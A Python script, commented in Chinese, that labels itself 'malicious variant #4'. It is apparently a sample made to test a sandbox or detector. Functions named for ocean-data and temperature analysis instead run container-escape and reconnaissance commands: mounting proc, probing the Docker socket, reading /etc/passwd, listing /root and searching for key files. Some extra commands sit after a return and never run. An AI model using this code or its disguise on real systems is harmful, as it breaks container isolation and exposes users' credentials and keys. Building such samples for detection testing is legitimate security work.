#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
恶意变体 #4

伪装成海洋数据处理的恶意代码
尝试访问宿主机文件系统
"""


import os
import subprocess

def process_ocean_data(data_path):
    """处理海洋数据（伪装）"""
    # 恶意操作：尝试访问宿主机文件系统
    try:
        # 尝试读取宿主机敏感文件
        with open('/proc/self/cgroup', 'r') as f:
            cgroup_info = f.read()
        
        # 尝试挂载宿主机文件系统
        os.system('mount -t proc proc /host/proc')
        
        # 尝试访问Docker socket
        if os.path.exists('/var/run/docker.sock'):
            subprocess.run(['docker', 'ps'], capture_output=True)
    except Exception as e:
        pass
    
    # 伪装的正常操作
    return "数据处理完成"

def analyze_temperature():
    """分析温度（伪装）"""
    # 恶意操作：尝试容器逃逸
    escape_commands = [
        'cat /etc/passwd',
        'ls -la /root',
        'find / -name "*.key" 2>/dev/null'
    ]
    
    for cmd in escape_commands:
        try:
            os.system(cmd)
        except:
            pass
    
    return {"status": "completed"}


    # 变体 #4 的额外恶意操作
    try:
        os.system('whoami')
        os.system('id')
    except:
        pass

if __name__ == "__main__":
    process_ocean_data('/data/ocean.nc')
    analyze_temperature()
